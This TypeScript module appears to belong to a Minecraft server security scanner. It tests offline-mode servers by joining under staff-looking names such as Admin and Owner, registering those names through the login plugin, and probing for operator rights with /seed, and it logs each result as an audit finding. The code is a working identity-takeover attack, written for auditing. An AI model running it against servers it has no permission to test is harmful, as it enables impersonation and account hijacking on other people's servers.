import { randomBytes } from 'node:crypto'
import type { EngineModule } from '../types'
import { JoinFailure, McSession, detectAuthPrompt, sleep } from './lib/mcSession'

const DEFAULT_NAMES = ['Admin', 'Owner', 'Moderator']

export const accessOfflineOp: EngineModule = {
  id: 'access.offline-op',
  title: 'Offline-mode identity takeover',
  async run(ctx) {
    const fromParams = (ctx.params.names ?? '')
      .split(',')
      .map((name) => name.trim())
      .filter(Boolean)
    const fromScan = (ctx.state.evidence.claimableNames as string[] | undefined) ?? []
    const names = (fromParams.length > 0 ? fromParams : fromScan.length > 0 ? fromScan : DEFAULT_NAMES).slice(0, 6)

    for (const name of names) {
      if (ctx.signal.aborted) return
      ctx.log(`─ trying identity "${name}"`)
      let session: McSession
      try {
        session = await McSession.open(ctx.target, name)
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error)
        ctx.log(`join failed: ${message}`)
        if (/online.?mode|encrypt|verify|authenticate/i.test(message)) {
          ctx.evidence('offlineMode', false)
          ctx.finding({
            id: 'online-mode-enforced',
            severity: 'info',
            title: 'Server enforces online-mode',
            detail:
              'The join was rejected during authentication, so the server requires Mojang sessions. Offline name impersonation does not apply here.',
            evidence: { reason: message }
          })
          return
        }
        if (/whitelist/i.test(message)) {
          ctx.finding({
            id: 'whitelist-enforced',
            severity: 'info',
            title: 'Whitelist enforced',
            detail:
              'The server rejected the join because the name is not whitelisted. Whitelisting plus online-mode is the intended hardening.',
            evidence: { reason: message }
          })
          return
        }
        if (error instanceof JoinFailure) continue
        throw error
      }

      try {
        ctx.evidence('offlineMode', true)
        ctx.log(`joined as "${name}" — the server accepts arbitrary names (offline-mode)`)
        const prompt = await detectAuthPrompt(session)

        if (prompt === 'register') {
          ctx.log('login plugin asks for registration — registering the name')
          const password = `SecurLab-${randomBytes(4).toString('hex')}`
          const confirmed = await session.sendAndCollect(`/register ${password} ${password}`, 1500, 8000)
          if (/successfully registered|success/i.test(confirmed)) {
            const registered = (ctx.state.evidence.registeredNames as string[] | undefined) ?? []
            ctx.evidence('registeredNames', [...registered, name])
            ctx.log(`registered "${name}" with a chosen password`)
          } else {
            ctx.log(`registration not confirmed: ${confirmed.trim().slice(0, 160) || '(no response)'}`)
            ctx.finding({
              id: 'registration-blocked',
              severity: 'info',
              title: `Registration of "${name}" was not confirmed`,
              detail:
                'The login plugin did not confirm an account registration (possibly captcha, e-mail verification or a registration lock).',
              evidence: { name, output: confirmed.slice(0, 300) }
            })
            continue
          }
        } else if (prompt === 'login') {
          ctx.log(`"${name}" is already registered — a password is required (password spray chain C5 targets this)`)
          ctx.finding({
            id: 'account-registered',
            severity: 'info',
            title: `Account "${name}" is registered`,
            detail:
              'The name resolves to a registered account, so identity takeover needs credentials. The password spray chain (C5) tests weak credentials.',
            evidence: { name }
          })
          continue
        } else {
          ctx.log('no login prompt observed — the server may have no authentication plugin')
          ctx.finding({
            id: 'no-auth-prompt',
            severity: 'medium',
            title: 'Joins are accepted without any login prompt',
            detail:
              'No registration or login prompt was observed after joining. On an offline-mode server this means anyone can act under any name with no credentials at all.',
            evidence: { name }
          })
        }

        ctx.log('checking operator status via /seed')
        const seedOutput = await session.sendAndCollect('/seed')
        const isOperator = /seed:/i.test(seedOutput)
        ctx.log(isOperator ? '/seed allowed → operator status' : '/seed denied → not an operator')

        if (isOperator) {
          ctx.evidence('opGainedAs', name)
          ctx.finding({
            id: 'offline-op-gained',
            severity: 'high',
            title: `Operator access gained as "${name}"`,
            detail:
              'The name carries operator status and the join+authentication path did not prevent claiming it. An unauthenticated attacker gets console-level command execution on this server.',
            evidence: { name, proofCommand: '/seed', output: seedOutput.slice(0, 200) }
          })
          return
        }

        await session.sendAndCollect('/list', 900, 4000)
        ctx.finding({
          id: 'name-claimed',
          severity: 'medium',
          title: `Identity "${name}" claimable by anyone`,
          detail:
            'The name can be joined freely on this offline-mode server. No operator rights were proven, but impersonation of a staff-looking name is possible.',
          evidence: { name }
        })
      } finally {
        session.close()
      }
      await sleep(600)
    }
  }
}
